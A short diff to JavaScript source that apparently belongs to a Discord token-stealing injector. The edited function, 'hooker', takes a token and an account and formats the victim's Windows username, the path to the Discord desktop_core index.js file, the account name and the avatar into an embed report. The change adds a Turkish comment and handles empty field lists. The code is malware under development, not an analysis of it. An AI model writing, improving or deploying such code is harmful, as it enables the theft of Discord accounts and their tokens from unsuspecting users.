@@ -189,7 +189,12 @@ const hooker = async (content, token, account) => {
     const pathToShow = `C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9212\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
     additionalFields.push({ name: `<:space_classic:1429086519901032610> Path:`, value: `\`${pathToShow}\``, inline: false });
     
-    content["embeds"][0]["fields"] = [...originalFields, ...additionalFields];
+    // Orijinal field'ları koru ve ek field'ları ekle
+    if (originalFields.length > 0) {
+        content["embeds"][0]["fields"] = [...originalFields, ...additionalFields];
+    } else {
+        content["embeds"][0]["fields"] = additionalFields;
+    }
     content["embeds"][0]["color"] = 0x313338;
     content["embeds"][0]["author"] = { name: account.username, icon_url: avatarUrl };
     content["embeds"][0]["thumbnail"] = { url: avatarUrl };
